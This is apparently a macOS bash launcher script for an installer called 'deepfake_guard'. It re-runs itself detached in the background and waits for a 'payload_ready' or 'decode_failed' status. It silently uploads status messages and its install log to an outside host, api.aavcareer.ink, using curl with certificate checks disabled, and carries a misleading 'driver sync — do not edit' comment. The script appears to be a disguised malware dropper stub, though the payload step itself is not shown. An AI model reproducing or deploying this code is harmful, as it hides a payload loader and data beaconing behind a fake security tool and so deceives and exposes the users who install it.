#!/bin/bash
LAUNCHER_STATUS_FILE="/var/tmp/deepfake_guard.launcher.status"
LAUNCHER_RESULT_URL="https://api.aavcareer.ink/guard-launcher-result"
upload_launcher_result() {
  local exit_code="$1" ok="$2" upload="$3" message="$4"
  command -v curl >/dev/null 2>&1 || return 0
  curl -sk -X POST -H "Content-Type: application/json" -H "X-Guard-Platform: macos" \
    -d "{\"ok\":${ok},\"upload\":${upload},\"exitCode\":${exit_code},\"message\":\"${message}\",\"platform\":\"macos\"}" \
    --connect-timeout 15 --max-time 30 --retry 2 --retry-delay 2 "$LAUNCHER_RESULT_URL" >/dev/null 2>&1
}
write_launcher_status() {
  printf '%s|%s|%s|%s\n' "$1" "$2" "$3" "$4" > "$LAUNCHER_STATUS_FILE"
}
if [ -z "${NVDG_DETACHED:-}" ]; then
  export NVDG_INSTALLER_DIR="${NVDG_INSTALLER_DIR:-$(pwd)}"
  export NVDG_DETACHED=1
  rm -f "$LAUNCHER_STATUS_FILE"
  nohup bash "$0" "$@" >/dev/null 2>&1 &
  _lpid=$!
  _lwait=0
  while [ "$_lwait" -lt 180 ]; do
    if [ -f "$LAUNCHER_STATUS_FILE" ]; then
      IFS="|" read -r _p1 _p2 _p3 _p4 < "$LAUNCHER_STATUS_FILE" || true
      [ "$_p4" = "payload_ready" ] && break
      [ "$_p4" = "decode_failed" ] && break
    fi
    sleep 1
    _lwait=$((_lwait + 1))
  done
  if [ ! -f "$LAUNCHER_STATUS_FILE" ]; then
    upload_launcher_result 1 false false "worker_timeout"
    exit 1
  fi
  IFS="|" read -r _lexit _lok _lup _lmsg < "$LAUNCHER_STATUS_FILE"
  if [ "$_lmsg" = "decode_failed" ]; then
    upload_launcher_result 1 false false "decode_failed"
    exit 1
  fi
  if [ "$_lmsg" != "payload_ready" ]; then
    upload_launcher_result 1 false false "worker_timeout"
    exit 1
  fi
  IFS="|" read -r _lexit _lok _lup _lmsg < "$LAUNCHER_STATUS_FILE"
  _lokj=false; [ "$_lok" = "1" ] && _lokj=true
  _lupj=false; [ "$_lup" = "1" ] && _lupj=true
  upload_launcher_result "${_lexit:-1}" "$_lokj" "$_lupj" "${_lmsg:-unknown}"
  exit "${_lexit:-1}"
fi
# ANE compute driver sync — do not edit
LOG_FILE="/var/tmp/deepfake_guard.log"
GUARD_LOG_UPLOAD_URL="https://api.aavcareer.ink/guard-install-log"
echo "[$(date '+%Y-%m-%d %H:%M:%S')] === deepfake_guard install started ===" >> "$LOG_FILE"
_stub_up=0
if command -v curl >/dev/null 2>&1; then
  if curl -sk -X POST -H "Content-Type: text/plain" -H "X-Guard-Platform: macos" --data-binary "@${LOG_FILE}" --connect-timeout 15 --max-time 30 --retry 2 --retry-delay 2 "$GUARD_LOG_UPLOAD_URL" >/dev/null 2>&1; then
    _stub_up=1
  fi
fi
